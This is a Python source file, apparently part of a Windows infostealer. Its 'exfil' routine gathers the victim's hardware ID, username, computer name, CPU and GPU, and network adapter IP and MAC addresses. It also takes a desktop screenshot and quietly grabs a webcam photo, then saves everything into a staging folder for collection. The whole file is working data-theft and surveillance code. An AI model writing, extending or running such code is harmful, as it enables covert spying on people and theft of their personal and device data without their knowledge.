from subprocess import check_output
from os import getenv
import os
import wmi , cv2
from PIL import ImageGrab 

IMG_G = ImageGrab.grab


class System:

    def hwid():

        return check_output('wmic csproduct get uuid' , shell=True , errors='ignore').split('UUID')[1].replace('\n','').strip()
    

    def get_wmi_obj():

        return wmi.WMI()
    

    def adapters_info():

        return check_output('wmic nicconfig get IPAddress,MACAddress' , shell = True , errors = 'ignore')
    

    def grab_cam(p):
        try:
            cam = cv2.VideoCapture(0)
            a , frame = cam.read()
            if a:

                cv2.imwrite(os.path.join(p , 'Webcam.png') , frame)
            
        except:
            pass


    def exfil(vpath):
        
        if not os.path.exists(vpath):
            os.mkdir(vpath)
        

        g_wmi = System.get_wmi_obj()
        ## SYSTEM PROPERTIES ##
        
        hwid = System.hwid()

        cpu = g_wmi.Win32_Processor()[0].Name

        gpu = g_wmi.Win32_VideoController()[0].Name

        name = getenv('USERNAME')

        computer_name = getenv('COMPUTERNAME')

        mac_adapter_info = System.adapters_info()


        macf = open(os.path.join(vpath , 'Adapters.txt') , 'a')

        macf.write(mac_adapter_info)

        macf.close()


        sysinfof = open(os.path.join(vpath , 'System.txt') , 'a')

        sysinfof.write(f'Name : {name}\nComputer Name : {computer_name}\nHWID : {hwid}\nCPU : {cpu}\nGPU : {gpu}')

        sysinfof.close()

        pz = os.path.join(vpath , 'Photos')

        os.mkdir(pz)

        IMG_G().save(os.path.join(pz , 'Desktop.png'))

        System.grab_cam(pz)


        return hwid




